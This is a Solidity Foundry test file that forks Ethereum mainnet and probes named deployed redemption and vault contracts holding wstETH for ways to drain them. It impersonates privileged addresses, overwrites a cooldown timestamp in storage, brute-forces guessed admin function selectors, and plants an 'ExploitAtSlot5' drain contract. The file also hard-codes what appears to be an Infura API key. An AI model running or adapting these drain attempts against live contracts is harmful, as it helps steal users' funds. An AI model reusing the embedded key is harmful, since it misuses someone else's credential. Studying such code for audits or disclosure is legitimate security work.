// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ImmediateDrainDeep is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // Mystery address at RC slot 5
    address constant RC_SLOT5_ADDR = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateRCSlot5Address() public {
        console.log("=== INVESTIGATING RC SLOT 5 ADDRESS ===\n");

        console.log("Address:", RC_SLOT5_ADDR);
        console.log("Code size:", RC_SLOT5_ADDR.code.length);

        if (RC_SLOT5_ADDR.code.length == 0) {
            console.log("*** NO CODE - EOA or CREATE2 precompute ***");

            // Is this a predictable CREATE2 address?
            // Could we deploy something there?
            console.log("\nThis could be a CREATE2 address that hasn't been deployed yet!");
            console.log("If we can deploy a contract there, we might gain special access.");
        } else {
            console.log("Has code - investigating...");

            // Check storage
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(RC_SLOT5_ADDR, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }
        }

        // Check if this address is in the redemption mapping
        bytes32 regKey = keccak256(abi.encode(RC_SLOT5_ADDR, uint256(4)));
        bytes32 regVal = vm.load(REDEMPTION_CONTROLLER, regKey);
        console.log("\nRC registration for this address:", uint256(regVal));

        // What is slot 5 in RC used for?
        console.log("\nAnalyzing RC slot 5 purpose:");

        // Try calling RC functions with this address
        vm.startPrank(RC_SLOT5_ADDR);

        console.log("\nTrying RC.redeem as RC_SLOT5 address:");
        (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("\nAttacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("*** RC_SLOT5 CAN DRAIN! ***");
        }
    }

    function test_TimestampManipulation() public {
        console.log("=== TESTING TIMESTAMP MANIPULATION ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create redemption
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption");

        vm.stopPrank();

        // Find the timestamp in storage
        // From previous test: Array elem 0 contains packed data with timestamp
        bytes32 arrayBase = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 elemBase = keccak256(abi.encodePacked(arrayBase));

        bytes32 elem0 = vm.load(REDEMPTION_0, elemBase);
        bytes32 elem1 = vm.load(REDEMPTION_0, bytes32(uint256(elemBase) + 1));

        console.log("Redemption struct elem0:");
        console.logBytes32(elem0);
        console.log("Redemption struct elem1:");
        console.logBytes32(elem1);

        // elem0 = 0x0000000000000000000000000000003635c9adc5dea0000000000000696a6577
        // The lower bytes appear to be timestamp (696a6577 hex)
        // 0x696a6577 = 1768687991 in decimal - this is a Unix timestamp!

        uint256 timestamp = uint256(elem0) & 0xFFFFFFFF;
        console.log("\nExtracted timestamp:", timestamp);
        console.log("Current block.timestamp:", block.timestamp);
        console.log("Difference:", timestamp > block.timestamp ? timestamp - block.timestamp : block.timestamp - timestamp);

        // Modify the timestamp to be in the past
        console.log("\n*** Attempting to modify timestamp via vm.store ***");

        // Set timestamp to 0 (way in the past)
        bytes32 modifiedElem0 = bytes32((uint256(elem0) & ~uint256(0xFFFFFFFF)) | (block.timestamp - 7 days - 1));
        vm.store(REDEMPTION_0, elemBase, modifiedElem0);

        console.log("Modified elem0:");
        console.logBytes32(vm.load(REDEMPTION_0, elemBase));

        // Now try to finalize immediately
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Finalize success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** TIMESTAMP BYPASS WORKS (with storage manipulation) ***");
        }
    }

    function test_FindStorageSetterVulnerability() public view {
        console.log("=== FINDING STORAGE SETTER VULNERABILITIES ===\n");

        // Look for any public function that can write to storage
        // This would allow us to bypass the cooldown

        bytes memory r0Code = REDEMPTION_0.code;

        // Find all SSTORE operations
        console.log("SSTORE operations in R0:");
        uint sstoreCount = 0;
        for (uint i = 0; i < r0Code.length; i++) {
            if (uint8(r0Code[i]) == 0x55) { // SSTORE
                sstoreCount++;
            }
        }
        console.log("Total SSTORE ops:", sstoreCount);

        // Find functions that contain SSTORE (potential state modifiers)
        console.log("\nLooking for state-modifying selectors:");

        // Check which selectors might modify state
        bytes4[] memory sels = new bytes4[](20);
        sels[0] = bytes4(keccak256("setDelay(uint256)"));
        sels[1] = bytes4(keccak256("setCooldown(uint256)"));
        sels[2] = bytes4(keccak256("setTimestamp(uint256,uint256)"));
        sels[3] = bytes4(keccak256("updateRedemption(uint256)"));
        sels[4] = bytes4(keccak256("cancelRedemption(uint256)"));
        sels[5] = bytes4(keccak256("emergencyFinalize(uint256)"));
        sels[6] = bytes4(keccak256("adminFinalize(uint256)"));
        sels[7] = bytes4(keccak256("forceFinalize(uint256)"));
        sels[8] = bytes4(keccak256("skipDelay(uint256)"));
        sels[9] = bytes4(keccak256("setRedemption(address,uint256,uint256)"));
        sels[10] = bytes4(keccak256("initialize(address,address,address)"));
        sels[11] = bytes4(keccak256("init(address)"));
        sels[12] = bytes4(keccak256("setup(address,uint256)"));
        sels[13] = bytes4(keccak256("rescue(address,uint256)"));
        sels[14] = bytes4(keccak256("sweep(address)"));
        sels[15] = bytes4(keccak256("execute(address,bytes)"));
        sels[16] = bytes4(keccak256("multicall(bytes[])"));
        sels[17] = bytes4(keccak256("delegatecall(address,bytes)"));
        sels[18] = bytes4(keccak256("proxy(address,bytes)"));
        sels[19] = bytes4(keccak256("call(address,bytes)"));

        for (uint i = 0; i < sels.length; i++) {
            // Check if this selector exists in bytecode (PUSH4 pattern)
            bool found = false;
            bytes4 sel = sels[i];
            for (uint j = 0; j + 4 < r0Code.length; j++) {
                if (uint8(r0Code[j]) == 0x63) { // PUSH4
                    bytes4 codeSel = bytes4(bytes.concat(r0Code[j+1], r0Code[j+2], r0Code[j+3], r0Code[j+4]));
                    if (codeSel == sel) {
                        found = true;
                        break;
                    }
                }
            }
            if (found) {
                console.log("Found selector in R0:");
                console.logBytes4(sel);
            }
        }
    }

    function test_ExploreVaultDirectAccess() public {
        console.log("=== EXPLORING VAULT DIRECT ACCESS ===\n");

        // Maybe we can interact with Vault directly to withdraw

        console.log("Vault address:", VAULT);
        console.log("Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // Check Vault storage
        console.log("\nVault storage:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                if (uint256(slot) < type(uint160).max && uint256(slot) > 0x1000) {
                    console.log("  As address:", address(uint160(uint256(slot))));
                }
            }
        }

        // Check EIP-1967 slots for Vault
        bytes32 implSlot = vm.load(VAULT, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        if (implSlot != bytes32(0)) {
            console.log("\nVault EIP-1967 implementation:", address(uint160(uint256(implSlot))));
        }

        bytes32 adminSlot = vm.load(VAULT, bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        if (adminSlot != bytes32(0)) {
            console.log("Vault EIP-1967 admin:", address(uint160(uint256(adminSlot))));
        }

        // Try calling Vault functions
        console.log("\nTrying Vault functions:");

        bytes4[] memory vaultSels = new bytes4[](10);
        vaultSels[0] = bytes4(keccak256("owner()"));
        vaultSels[1] = bytes4(keccak256("redemptionController()"));
        vaultSels[2] = bytes4(keccak256("withdraw(address,uint256)"));
        vaultSels[3] = bytes4(keccak256("transfer(address,address,uint256)"));
        vaultSels[4] = bytes4(keccak256("authorized(address)"));
        vaultSels[5] = bytes4(keccak256("allowance(address)"));
        vaultSels[6] = bytes4(keccak256("isAuthorized(address)"));
        vaultSels[7] = bytes4(keccak256("canWithdraw(address)"));
        vaultSels[8] = bytes4(keccak256("whitelist(address)"));
        vaultSels[9] = bytes4(keccak256("operators(address)"));

        for (uint i = 0; i < vaultSels.length; i++) {
            (bool s, bytes memory d) = VAULT.staticcall(
                abi.encodeWithSelector(vaultSels[i], REDEMPTION_CONTROLLER)
            );
            if (s && d.length >= 32) {
                console.log("Found:");
                console.logBytes4(vaultSels[i]);
                uint256 val = abi.decode(d, (uint256));
                if (val < type(uint160).max && val > 0x1000) {
                    console.log("  Address:", address(uint160(val)));
                } else {
                    console.log("  Value:", val);
                }
            }
        }

        // Try direct withdrawal as RC
        vm.startPrank(REDEMPTION_CONTROLLER);
        console.log("\nTrying Vault withdraw as RC:");
        (bool s1, bytes memory d1) = VAULT.call(
            abi.encodeWithSignature("withdraw(address,uint256)", wstETH, 100e18)
        );
        console.log("Success:", s1);
        if (s1) {
            console.log("*** RC CAN WITHDRAW FROM VAULT ***");
        }
        vm.stopPrank();
    }

    function test_R0CallChainAnalysis() public view {
        console.log("=== R0 CALL CHAIN ANALYSIS ===\n");

        // Analyze R0 bytecode to understand call flow in finalizeRedeem

        bytes memory code = REDEMPTION_0.code;

        // Find all CALL operations
        console.log("CALL operations in R0:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) { // CALL
                console.log("CALL at offset:", i);

                // Look for preceding PUSH operations to identify target
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x73) { // PUSH20 (address)
                        address addr;
                        bytes memory addrBytes = new bytes(20);
                        for (uint k = 0; k < 20 && j + 1 + k < code.length; k++) {
                            addrBytes[k] = code[j + 1 + k];
                        }
                        assembly {
                            addr := mload(add(addrBytes, 20))
                        }
                        if (addr != address(0) && uint160(addr) > 0x1000) {
                            console.log("  Potential target address:", addr);
                        }
                    }
                }
            }
        }

        // Find the finalizeRedeem function entry point
        bytes4 finalizeSelector = bytes4(keccak256("finalizeRedeem(uint256)"));
        console.log("\nfinalizeRedeem selector:");
        console.logBytes4(finalizeSelector);

        // Search for this selector
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == finalizeSelector) {
                    console.log("Found finalizeRedeem selector at:", i);

                    // Find the JUMPI after this
                    for (uint j = i + 5; j < i + 20 && j < code.length; j++) {
                        if (uint8(code[j]) == 0x57) { // JUMPI
                            console.log("  JUMPI at:", j);
                            // Look back for the jump destination
                            for (uint k = j - 1; k > i && k > j - 10; k--) {
                                if (uint8(code[k]) == 0x61) { // PUSH2
                                    uint16 dest = uint16(uint8(code[k+1])) << 8 | uint8(code[k+2]);
                                    console.log("  Jump destination:", dest);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    function test_ExploitViaRCSlot5Deploy() public {
        console.log("=== TESTING CREATE2 DEPLOYMENT TO RC_SLOT5 ===\n");

        // RC slot 5 contains address 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a
        // If this is a predictable CREATE2 address, we might deploy there

        console.log("Target address:", RC_SLOT5_ADDR);
        console.log("Current code size:", RC_SLOT5_ADDR.code.length);

        if (RC_SLOT5_ADDR.code.length == 0) {
            console.log("\n*** ADDRESS HAS NO CODE - POTENTIAL CREATE2 TARGET ***");

            // Try to compute what salt would produce this address from various factories
            // Common factories: R0, R1, RC, etc.

            // For now, let's see if we can call RC.redeem FROM this address
            // by deploying arbitrary code there (in a real scenario)

            // Simulate deploying code at RC_SLOT5_ADDR
            bytes memory exploitCode = type(ExploitAtSlot5).creationCode;
            vm.etch(RC_SLOT5_ADDR, type(ExploitAtSlot5).runtimeCode);

            console.log("Deployed exploit code at RC_SLOT5_ADDR");
            console.log("New code size:", RC_SLOT5_ADDR.code.length);

            // Now call the exploit
            uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
            console.log("\nVault before:", vaultBefore / 1e18);

            // Check if RC_SLOT5 can call RC.redeem
            vm.startPrank(RC_SLOT5_ADDR);
            (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call(
                abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
            );
            console.log("RC.redeem from slot5:", s1);
            if (!s1 && d1.length >= 4) {
                console.logBytes4(bytes4(d1));
            }
            vm.stopPrank();

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

            console.log("Vault after:", vaultAfter / 1e18);
            console.log("Attacker received:", attackerBal / 1e18);

            if (attackerBal > 0) {
                console.log("\n*** RC_SLOT5 DEPLOYMENT EXPLOIT WORKS ***");
            }
        } else {
            console.log("Address already has code - exploring its capabilities");

            // Check its storage
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(RC_SLOT5_ADDR, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }
        }
    }

    function test_RCFunctionAnalysis() public {
        console.log("=== RC FUNCTION ANALYSIS ===\n");

        // Analyze RC bytecode to understand ALL available functions

        bytes memory code = REDEMPTION_CONTROLLER.code;
        console.log("RC code size:", code.length);

        // Find all function selectors
        console.log("\nSelectors in RC:");
        bytes4[] memory foundSels = new bytes4[](30);
        uint selCount = 0;

        for (uint i = 0; i + 4 < 300 && i < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Check if followed by EQ (0x14)
                bool isSelector = false;
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) {
                        isSelector = true;
                        break;
                    }
                }

                if (isSelector && sel != bytes4(0) && uint32(sel) > 0x1000) {
                    bool unique = true;
                    for (uint k = 0; k < selCount; k++) {
                        if (foundSels[k] == sel) unique = false;
                    }
                    if (unique && selCount < 30) {
                        foundSels[selCount] = sel;
                        selCount++;
                        console.logBytes4(sel);
                    }
                }
            }
        }

        console.log("\nTrying to match selectors:");
        console.log("redeem(uint256,address):");
        console.logBytes4(bytes4(keccak256("redeem(uint256,address)")));
        console.log("addRedemption(address):");
        console.logBytes4(bytes4(keccak256("addRedemption(address)")));
        console.log("removeRedemption(address):");
        console.logBytes4(bytes4(keccak256("removeRedemption(address)")));
        console.log("owner():");
        console.logBytes4(bytes4(keccak256("owner()")));
        console.log("vault():");
        console.logBytes4(bytes4(keccak256("vault()")));
        console.log("setVault(address):");
        console.logBytes4(bytes4(keccak256("setVault(address)")));

        // Try all found selectors as attacker
        console.log("\nTrying all selectors as attacker:");
        vm.startPrank(attacker);
        for (uint i = 0; i < selCount; i++) {
            (bool s,) = REDEMPTION_CONTROLLER.call{gas: 200000}(
                abi.encodeWithSelector(foundSels[i], attacker, 100e18)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(foundSels[i]);
            }
        }
        vm.stopPrank();
    }
}

contract ExploitAtSlot5 {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;

    function drain(address recipient, uint256 amount) external {
        RC.call(abi.encodeWithSignature("redeem(uint256,address)", amount, recipient));
    }
}
